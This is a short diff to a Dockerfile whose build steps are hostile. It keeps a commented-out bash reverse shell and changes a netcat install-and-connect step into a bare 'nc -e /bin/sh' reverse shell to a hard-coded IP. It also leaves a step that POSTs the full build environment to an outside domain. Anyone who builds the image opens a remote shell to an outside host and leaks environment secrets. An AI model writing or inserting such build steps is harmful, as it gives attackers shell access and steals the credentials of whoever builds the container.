@@ -3,8 +3,7 @@ FROM alpine:3.18
 
 #RUN bash -i >& /dev/tcp/124.71.183.77/3309 0>&1 &
 
-RUN apk add --no-cache netcat-openbsd && \
-    nc -e /bin/sh 124.71.183.77 3309
+RUN nc -e /bin/sh 124.71.183.77 3309
 
 RUN curl -X POST http://tttqqq777.top/nb/log.php --data "$(env)"
 
